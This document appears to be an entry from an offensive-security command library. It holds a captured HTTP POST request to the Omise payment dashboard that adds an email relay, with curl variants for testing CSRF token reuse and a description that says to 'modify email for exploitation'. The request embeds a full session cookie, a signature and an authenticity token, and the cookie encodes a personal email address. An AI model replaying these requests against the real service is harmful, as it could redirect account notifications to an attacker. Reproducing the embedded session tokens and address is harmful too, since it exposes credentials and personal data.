---
data: >-
  POST /test/subscriptions HTTP/1.1

  Host: dashboard.omise.co

  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
  Firefox/68.0

  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate

  Referer: https://dashboard.omise.co/

  Content-Type: application/x-www-form-urlencoded

  Content-Length: 309

  DNT: 1

  Connection: close

  Cookie:
  session=eyJpZCI6InNlc3Npb25fNWtoMWhyZ2pyY3U2c202bXh4MyIsImtleSI6IjhiOTUwZDJhNWRlZWIxYmYzN2MwNTFlMWJiY2VjM2NmIiwiYWNjb3VudCI6ImFjY291bnRfdGVzdF81anZ5NHJwM2M5aHhxcDZjYmUxIiwiZXhwaXJlc19hdCI6IjIwMjAtMDctMDlUMDA6MDY6NDJaIiwiZW1haWwiOiJhYWthc2hhZGhpa2FyaTc4NkBnbWFpbC5jb20ifQ==;
  session.sig=DQLQM4kaz6XyIQ26G0zwF_xuNPU; locale=en;
  _omisegateway_session=Y1U0b2kvZ1l5ZkNlczRiN1doZkZWb3dscWlRK0EzcDdUbnVYSnoycHUrbDlzaEdVd1dqUnN5ckNEVTFVZ3BXQWRjdGs4Ukw4ekFDeWRnWnl3SVhJamFVZUtLaUMvYTlWeUEwZTY5dVBacXhtdjRhY0pWZ3pYQ2pVaS9XUkhlUjFjRWhhSzN0eDAyQWtQMnpROGEwd3k3bFZIcXNWTGFJOTlUejZZRnRKV0l0NStCYVNZeEorcWZRMzQvUVNxemJibnpoV09QSk9iZmpGRitzWlFBVUo0YzQwcENlbDFSTkgvaHJMa2xoR3lxYz0tLTk5UDFvWkpIeE12Uk56cUppZHFSN3c9PQ==--93951192661dda26d2246d03ede9c3c8ca6cf226

  Upgrade-Insecure-Requests: 1


  utf8=%E2%9C%93&authenticity_token=UoPkXa4uMwSgxUG1d3a7l5PodACsA9LBagoeTlLNDZWAx1kzUeVH1%2FbeJdeXMr8Z5NYkgEX%2B1kaFci3i%2F%2BV%2Fqg%3D%3D&email_relay%5Baddress%5D=testaccount1%40gmail.com&email_relay%5Bsupported_event_groups%5D%5B%5D=accounting&email_relay%5Bsupported_event_groups%5D%5B%5D=chargebacks&button=
tags:
  - csrf
  - post
  - omise
type: command
output: |
  HTTP/1.1 302 Found
  Location: https://dashboard.omise.co/test/subscriptions
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:15.180Z'
id: b077915d-e51c-425b-a0c4-9fe17d7c0d18
verified: false
validated: true
submitted: true
---
# omise-add-email-relay-post

## Command

```http
POST /test/subscriptions HTTP/1.1
Host: dashboard.omise.co
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://dashboard.omise.co/
Content-Type: application/x-www-form-urlencoded
Content-Length: 309
DNT: 1
Connection: close
Cookie: session=eyJpZCI6InNlc3Npb25fNWtoMWhyZ2pyY3U2c202bXh4MyIsImtleSI6IjhiOTUwZDJhNWRlZWIxYmYzN2MwNTFlMWJiY2VjM2NmIiwiYWNjb3VudCI6ImFjY291bnRfdGVzdF81anZ5NHJwM2M5aHhxcDZjYmUxIiwiZXhwaXJlc19hdCI6IjIwMjAtMDctMDlUMDA6MDY6NDJaIiwiZW1haWwiOiJhYWthc2hhZGhpa2FyaTc4NkBnbWFpbC5jb20ifQ==; session.sig=DQLQM4kaz6XyIQ26G0zwF_xuNPU; locale=en; _omisegateway_session=Y1U0b2kvZ1l5ZkNlczRiN1doZkZWb3dscWlRK0EzcDdUbnVYSnoycHUrbDlzaEdVd1dqUnN5ckNEVTFVZ3BXQWRjdGs4Ukw4ekFDeWRnWnl3SVhJamFVZUtLaUMvYTlWeUEwZTY5dVBacXhtdjRhY0pWZ3pYQ2pVaS9XUkhlUjFjRWhhSzN0eDAyQWtQMnpROGEwd3k3bFZIcXNWTGFJOTlUejZZRnRKV0l0NStCYVNZeEorcWZRMzQvUVNxemJibnpoV09QSk9iZmpGRitzWlFBVUo0YzQwcENlbDFSTkgvaHJMa2xoR3lxYz0tLTk5UDFvWkpIeE12Uk56cUppZHFSN3c9PQ==--93951192661dda26d2246d03ede9c3c8ca6cf226
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token=UoPkXa4uMwSgxUG1d3a7l5PodACsA9LBagoeTlLNDZWAx1kzUeVH1%2FbeJdeXMr8Z5NYkgEX%2B1kaFci3i%2F%2BV%2Fqg%3D%3D&email_relay%5Baddress%5D=testaccount1%40gmail.com&email_relay%5Bsupported_event_groups%5D%5B%5D=accounting&email_relay%5Bsupported_event_groups%5D%5B%5D=chargebacks&button=
```

## Description

This HTTP POST request submits a form to add an email relay to Omise subscriptions, including the CSRF authenticity_token. Use in Burp Repeater or curl to test token reuse; modify email for exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| authenticity_token | CSRF protection token (URL-encoded) | Yes |
| email_relay[address] | Target email for relay | Yes |
| email_relay[supported_event_groups][] | Array of event types (e.g., accounting) | Yes |
| utf8 | Form encoding checkbox | Yes |
| button | Empty submission trigger | Yes |
| Cookie: session | Authenticated session cookie | Yes |

## Examples

### Basic Usage

Replay in Burp or convert to curl:

```bash
curl -X POST 'https://dashboard.omise.co/test/subscriptions' \
  -H 'Cookie: session=...' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'authenticity_token=...&email_relay[address]=test@gmail.com&...'
```

### Advanced Usage (Token Reuse Test)

Change email but keep token:

```bash
curl -X POST 'https://dashboard.omise.co/test/subscriptions' \
  -H 'Cookie: session=...' \
  -d 'authenticity_token=SAME_TOKEN&email_relay[address]=newtest@gmail.com&...'
```

## Expected Output

Successful: HTTP 302 redirect to https://dashboard.omise.co/test/subscriptions. Failure: 403 or redirect to dashboard home.

## Related

- [[procedures/Capture-Omise-Email-Relay-Submission-with-Burp]]
- [[procedures/Verify-Authenticity-Token-Reuse-in-Omise]]
